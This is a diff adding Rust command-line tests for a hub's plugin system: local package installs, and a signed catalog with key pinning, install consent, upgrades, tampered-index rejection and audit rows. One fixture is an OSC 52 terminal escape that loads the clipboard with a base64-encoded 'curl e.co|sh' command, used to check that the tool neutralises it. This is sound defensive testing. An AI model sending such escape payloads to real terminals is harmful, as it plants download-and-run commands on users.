@@ -735,6 +735,416 @@ fn the_fleet_view_is_turned_on_and_off_from_the_command_line() {
     let _ = std::fs::remove_dir_all(&root);
 }
 
+/// ADR-0114 decision 6: `agora hub plugin add|list|remove` on the hub's machine installs a checked package for the hub, refuses a bad
+/// one whole, and records each change in the audit trail as the owner's.
+#[test]
+fn plugins_are_added_listed_and_removed_from_the_command_line_and_audited() {
+    let root = tmp("plugins");
+    let fixtures = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+        .join("../agora-hub/tests/fixtures/plugin-packages");
+    let run = |dir: &Path, args: &[&str]| {
+        let o = agora(&root, args)
+            .arg("--hub-dir")
+            .arg(dir)
+            .output()
+            .unwrap();
+        (
+            o.status.code(),
+            String::from_utf8_lossy(&o.stdout).into_owned(),
+            String::from_utf8_lossy(&o.stderr).into_owned(),
+        )
+    };
+    let hub = root.join("hub");
+    std::fs::create_dir_all(&hub).unwrap();
+    let (code, out, _) = run(&hub, &["hub", "plugin", "list"]);
+    assert!(code == Some(0) && out.contains("No plugins"), "{out}");
+    let ok = fixtures.join("ok.bundle");
+    let (code, out, err) = run(&hub, &["hub", "plugin", "add", ok.to_str().unwrap()]);
+    assert!(
+        code == Some(0)
+            && out.contains("Installed")
+            && out.contains("demo")
+            && out.contains("agents.read"),
+        "{out}{err}"
+    );
+    let (code, out, _) = run(&hub, &["hub", "plugin", "list"]);
+    assert!(
+        code == Some(0) && out.contains("demo 1.0.0") && out.contains("agents.read"),
+        "{out}"
+    );
+    // A bad package is refused whole, with the window's reason; nothing of it is kept.
+    let bad = fixtures.join("hash.bundle");
+    let (code, _, err) = run(&hub, &["hub", "plugin", "add", bad.to_str().unwrap()]);
+    assert!(
+        code == Some(1) && err.contains("panel.css") && err.contains("Nothing was installed"),
+        "{err}"
+    );
+    let (code, _, err) = run(
+        &hub,
+        &[
+            "hub",
+            "plugin",
+            "add",
+            root.join("none.json").to_str().unwrap(),
+        ],
+    );
+    assert!(code == Some(1) && err.contains("Could not read"), "{err}");
+    let (code, _, err) = run(&hub, &["hub", "plugin", "remove", "nope"]);
+    assert!(code == Some(1) && err.contains("No plugin nope"), "{err}");
+    let (code, out, _) = run(&hub, &["hub", "plugin", "remove", "demo"]);
+    assert!(code == Some(0) && out.contains("Removed demo"), "{out}");
+    let (_, out, _) = run(&hub, &["hub", "plugin", "list"]);
+    assert!(out.contains("No plugins"), "{out}");
+    for bad in [
+        &["hub", "plugin"][..],
+        &["hub", "plugin", "add"],
+        &["hub", "plugin", "remove", "a", "b"],
+        &["hub", "plugin", "install", "x"],
+    ] {
+        let (code, _, err) = run(&hub, bad);
+        assert!(
+            code == Some(2) && err.contains("arguments"),
+            "{bad:?}: {err}"
+        );
+    }
+    // Each change is the owner's row in the audit trail.
+    let store = SqliteStore::open(&hub.join("hub.db")).unwrap();
+    let rows: Vec<(String, String, String, String)> = agora_hub::audit::Audit::new(&store)
+        .list(0, None, 100)
+        .unwrap()
+        .into_iter()
+        .filter(|r| r.action.starts_with("plugin."))
+        .map(|r| (r.who, r.action, r.node, r.outcome))
+        .collect();
+    let want = |w: &str, a: &str, n: &str, o: &str| {
+        (w.to_string(), a.to_string(), n.to_string(), o.to_string())
+    };
+    assert_eq!(
+        rows,
+        [
+            want("owner", "plugin.add", "demo@1.0.0", "ok"),
+            want("owner", "plugin.add", "", "package.hash"),
+            want("owner", "plugin.remove", "nope", "plugin.not_found"),
+            want("owner", "plugin.remove", "demo", "ok"),
+        ]
+    );
+    // A machine without a hub folder is told so, and nothing is made.
+    let none = root.join("no-hub");
+    let (code, _, _) = run(&none, &["hub", "plugin", "list"]);
+    assert_eq!(code, Some(1));
+    assert!(!none.exists(), "a hub folder was made");
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// A plain HTTP server on this machine answering each path from a map the test changes as it goes.
+fn serve_files(
+    files: std::sync::Arc<std::sync::Mutex<std::collections::HashMap<String, Vec<u8>>>>,
+) -> String {
+    use std::io::{Read as _, Write as _};
+    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let base = format!("http://127.0.0.1:{}", l.local_addr().unwrap().port());
+    std::thread::spawn(move || {
+        for s in l.incoming() {
+            let Ok(mut s) = s else { continue };
+            let mut got = [0u8; 2048];
+            let n = s.read(&mut got).unwrap_or(0);
+            let req = String::from_utf8_lossy(&got[..n]).to_string();
+            let path = req.split(' ').nth(1).unwrap_or("").to_string();
+            let body = files.lock().unwrap().get(&path).cloned();
+            let _ = match body {
+                Some(b) => s
+                    .write_all(
+                        format!("HTTP/1.0 200 OK\r\nContent-Length: {}\r\n\r\n", b.len())
+                            .as_bytes(),
+                    )
+                    .and_then(|()| s.write_all(&b)),
+                None => s.write_all(b"HTTP/1.0 404 Not Found\r\nContent-Length: 0\r\n\r\n"),
+            };
+        }
+    });
+    base
+}
+
+/// A plugin package of one entry script asking for `caps`.
+fn plugin_package(id: &str, version: &str, caps: &[&str]) -> Vec<u8> {
+    use agora_hub::sshsig::base64_encode;
+    let hex = |b: &[u8]| -> String {
+        ring::digest::digest(&ring::digest::SHA256, b)
+            .as_ref()
+            .iter()
+            .map(|x| format!("{x:02x}"))
+            .collect()
+    };
+    let entry = format!("agora.watch('agents.read', function () {{}}); // {version}");
+    let caps: Vec<String> = caps.iter().map(|c| format!("\"{c}\"")).collect();
+    let manifest = format!(
+        r#"{{"id":"{id}","name":"Demo {id}","version":"{version}","author":"Someone","licence":"MIT","min_agora":"0.1.0","panels":[{{"id":"main"}}],"capabilities":[{}],"entry":"panel.js","files":{{"panel.js":"{}"}}}}"#,
+        caps.join(","),
+        hex(entry.as_bytes())
+    );
+    format!(
+        r#"{{"agora-plugin-bundle":1,"files":{{"agora-plugin.json":"{}","panel.js":"{}"}}}}"#,
+        base64_encode(manifest.as_bytes()),
+        base64_encode(entry.as_bytes())
+    )
+    .into_bytes()
+}
+
+/// ADR-0114 decision 7, the whole procedure with the real tools: the maintainer's key from `ssh-keygen -t ed25519`, an index signed
+/// with `ssh-keygen -Y sign -n agora-plugin-catalog`; on the hub's machine the owner pins the `.pub`, turns the catalog on, fetches
+/// it, installs (asked first: with no terminal to ask in, only `--yes` installs), sees a newer version named, and upgrades with what
+/// changes in what it asks to see shown before the version. An index changed after signing changes nothing. Nothing from the catalog
+/// reaches the terminal as an escape sequence, and every step is an audit row of the owner's. Skipped where `ssh-keygen` is missing.
+#[test]
+fn the_plugin_catalog_is_pinned_fetched_installed_and_upgraded_from_the_command_line() {
+    if Command::new("ssh-keygen").arg("-?").output().is_err() {
+        eprintln!("ssh-keygen is not installed: skipped");
+        return;
+    }
+    let root = tmp("plugin-catalog");
+    let hub = root.join("hub");
+    std::fs::create_dir_all(&hub).unwrap();
+    let run = |args: &[&str]| {
+        let o = agora(&root, args)
+            .arg("--hub-dir")
+            .arg(&hub)
+            .output()
+            .unwrap();
+        (
+            o.status.code(),
+            String::from_utf8_lossy(&o.stdout).into_owned(),
+            String::from_utf8_lossy(&o.stderr).into_owned(),
+        )
+    };
+    let key = root.join("catalog");
+    assert!(Command::new("ssh-keygen")
+        .args(["-q", "-t", "ed25519", "-N", "", "-C", "catalog", "-f"])
+        .arg(&key)
+        .status()
+        .unwrap()
+        .success());
+    let files = std::sync::Arc::new(std::sync::Mutex::new(std::collections::HashMap::new()));
+    let base = serve_files(std::sync::Arc::clone(&files));
+    let url = format!("{base}/cat/index.json");
+    let sha = |b: &[u8]| -> String {
+        ring::digest::digest(&ring::digest::SHA256, b)
+            .as_ref()
+            .iter()
+            .map(|x| format!("{x:02x}"))
+            .collect()
+    };
+    // Publishes `index` signed as the maintainer would (or, with `tamper`, changed after signing) and the archives it names.
+    let publish = |serial: u64,
+                   plugins: &[(&str, &str, &[&str], serde_json::Value)],
+                   tamper: bool| {
+        let mut entries = Vec::new();
+        for (id, version, caps, extra) in plugins {
+            let a = plugin_package(id, version, caps);
+            let file = format!("plugins/{id}/{id}-{version}.json");
+            let mut e = serde_json::json!({"id": id, "name": format!("Demo {id}"), "version": version, "author": "Someone",
+                "licence": "MIT", "capabilities": caps, "sha256": sha(&a), "size": a.len(), "file": file});
+            if let (Some(o), Some(x)) = (e.as_object_mut(), extra.as_object()) {
+                o.extend(x.clone());
+            }
+            entries.push(e);
+            files.lock().unwrap().insert(format!("/cat/{file}"), a);
+        }
+        let index =
+            serde_json::json!({"agora-plugin-catalog": 1, "serial": serial, "plugins": entries})
+                .to_string();
+        let at = root.join("index.json");
+        std::fs::write(&at, &index).unwrap();
+        let _ = std::fs::remove_file(root.join("index.json.sig"));
+        assert!(Command::new("ssh-keygen")
+            .args(["-Y", "sign", "-n", "agora-plugin-catalog", "-f"])
+            .arg(&key)
+            .arg(&at)
+            .output()
+            .unwrap()
+            .status
+            .success());
+        let sig = std::fs::read(root.join("index.json.sig")).unwrap();
+        let mut index = index.into_bytes();
+        if tamper {
+            index.push(b' ');
+        }
+        let mut f = files.lock().unwrap();
+        f.insert("/cat/index.json".into(), index);
+        f.insert("/cat/index.json.sig".into(), sig);
+    };
+    let none = serde_json::json!({});
+    let evil = "\u{1b}]52;c;Y3VybCBlLmNvfHNoCg==\u{7}\u{1b}[2J";
+    let mut odd = serde_json::Map::new();
+    odd.insert(evil.to_string(), 1.into());
+    publish(
+        1,
+        &[
+            (
+                "demo",
+                "1.0.0",
+                &["agents.read", "theme.read"],
+                none.clone(),
+            ),
+            ("odd", "1.0.0", &[], serde_json::Value::Object(odd)),
+        ],
+        false,
+    );
+
+    let (code, out, _) = run(&["hub", "plugins", "status"]);
+    assert!(
+        code == Some(0) && out.contains("is off") && out.contains("No catalog key"),
+        "{out}"
+    );
+    let (code, _, err) = run(&["hub", "plugins", "update", "--url", &url]);
+    assert!(code == Some(1) && err.contains("No catalog key"), "{err}");
+    let (code, _, err) = run(&["hub", "plugins", "key", "set", key.to_str().unwrap()]);
+    assert!(code == Some(1) && err.contains("private key"), "{err}");
+    let public = format!("{}.pub", key.display());
+    let (code, out, _) = run(&["hub", "plugins", "key", "set", &public]);
+    assert!(code == Some(0) && out.contains("SHA256:"), "{out}");
+    // The fingerprint is the one `ssh-keygen -l` prints.
+    let listed = Command::new("ssh-keygen")
+        .args(["-l", "-f", &public])
+        .output()
+        .unwrap();
+    let fp = String::from_utf8_lossy(&listed.stdout)
+        .split_whitespace()
+        .nth(1)
+        .unwrap_or("")
+        .to_string();
+    assert!(!fp.is_empty() && out.contains(&fp), "{out} vs {fp}");
+
+    // `odd` is refused (a field it should not have), its name shown only as visible escapes; `demo` is kept.
+    let (code, out, err) = run(&["hub", "plugins", "update", "--url", &url]);
+    assert!(
+        code == Some(1) && out.contains("1 plugins kept, 1 refused"),
+        "{out}{err}"
+    );
+    assert!(
+        err.contains(r"\u{1b}]52;c;") && !err.contains('\u{1b}') && !out.contains('\u{1b}'),
+        "{err:?}"
+    );
+    assert!(out.contains("catalog is off"), "{out}");
+
+    let (code, _, err) = run(&["hub", "plugins", "install", "demo"]);
+    assert!(code == Some(1) && err.contains("catalog is off"), "{err}");
+    let (code, _, _) = run(&["hub", "plugins", "on"]);
+    assert_eq!(code, Some(0));
+    let (code, out, err) = run(&["hub", "plugins", "install", "demo"]);
+    assert!(
+        code == Some(1) && out.contains("agents.read, theme.read") && err.contains("no terminal"),
+        "{out}{err}"
+    );
+    let (_, out, _) = run(&["hub", "plugin", "list"]);
+    assert!(out.contains("No plugins"), "asked first: {out}");
+    let (code, out, err) = run(&["hub", "plugins", "install", "demo", "--yes"]);
+    assert!(
+        code == Some(0) && out.contains("Installed Demo demo 1.0.0"),
+        "{out}{err}"
+    );
+
+    // A newer version is fetched and named; nothing is upgraded until the owner says so.
+    publish(
+        2,
+        &[("demo", "1.1.0", &["agents.read", "chat.read"], none.clone())],
+        false,
+    );
+    let (code, out, err) = run(&["hub", "plugins", "update"]);
+    assert!(
+        code == Some(0) && out.contains("1.0.0 → 1.1.0"),
+        "{out}{err}"
+    );
+    let (_, out, _) = run(&["hub", "plugin", "list"]);
+    assert!(out.contains("demo 1.0.0"), "{out}");
+    let (code, out, err) = run(&["hub", "plugins", "upgrade", "demo", "--yes"]);
+    assert!(code == Some(0) && out.contains("Upgraded"), "{out}{err}");
+    let more = out.find("asks to see more: chat.read").expect(&out);
+    let less = out.find("no longer asks for: theme.read").expect(&out);
+    let version = out.find("1.0.0 → 1.1.0").expect(&out);
+    assert!(
+        more < version && less < version,
+        "capabilities first: {out}"
+    );
+    let (_, out, _) = run(&["hub", "plugin", "list"]);
+    assert!(
+        out.contains("demo 1.1.0") && out.contains("chat.read"),
+        "{out}"
+    );
+
+    // An index changed after it was signed changes nothing.
+    publish(
+        3,
+        &[("demo", "2.0.0", &["agents.read"], none.clone())],
+        true,
+    );
+    let (code, _, err) = run(&["hub", "plugins", "update"]);
+    assert!(
+        code == Some(1) && err.contains("does not match") && err.contains("Nothing was changed"),
+        "{err}"
+    );
+    let (code, out, _) = run(&["hub", "plugins", "status"]);
+    assert!(
+        code == Some(0) && out.contains("serial 2") && out.contains(&fp),
+        "{out}"
+    );
+
+    for bad in [
+        &["hub", "plugins"][..],
+        &["hub", "plugins", "install"],
+        &["hub", "plugins", "key", "set"],
+        &["hub", "plugins", "on", "--yes"],
+        &[
+            "hub",
+            "plugins",
+            "status",
+            "--url",
+            "https://h.example/i.json",
+        ],
+    ] {
+        let (code, _, err) = run(bad);
+        assert!(
+            code == Some(2) && err.contains("arguments"),
+            "{bad:?}: {err}"
+        );
+    }
+
+    let store = SqliteStore::open(&hub.join("hub.db")).unwrap();
+    let rows: Vec<(String, String, String)> = agora_hub::audit::Audit::new(&store)
+        .list(0, None, 200)
+        .unwrap()
+        .into_iter()
+        .filter(|r| r.action.starts_with("plugin_catalog."))
+        .map(|r| (r.who, r.action, r.outcome))
+        .collect();
+    let want: Vec<(String, String, String)> = [
+        ("plugin_catalog.update", "failed.no-key"),
+        ("plugin_catalog.key", "key.private"),
+        ("plugin_catalog.key", "ok"),
+        ("plugin_catalog.update", "partial"),
+        ("plugin_catalog.install", "off"),
+        ("plugin_catalog.on", "ok"),
+        ("plugin_catalog.install", "declined"),
+        ("plugin_catalog.install", "ok"),
+        ("plugin_catalog.update", "ok"),
+        ("plugin_catalog.upgrade", "ok"),
+        ("plugin_catalog.update", "failed.signature.invalid"),
+    ]
+    .iter()
+    .map(|(a, o)| ("owner".to_string(), a.to_string(), o.to_string()))
+    .collect();
+    assert_eq!(rows, want);
+
+    // Owner-only, on the hub's machine: a machine without a hub folder is told so, and nothing is made.
+    let elsewhere = root.join("no-hub");
+    let o = agora(&root, &["hub", "plugins", "status", "--hub-dir"])
+        .arg(&elsewhere)
+        .output()
+        .unwrap();
+    assert_eq!(o.status.code(), Some(1));
+    assert!(!elsewhere.exists(), "a hub folder was made");
+    let _ = std::fs::remove_dir_all(&root);
+}
+
 #[test]
 fn team_members_are_added_listed_changed_and_removed_from_the_command_line() {
     let root = tmp("users");
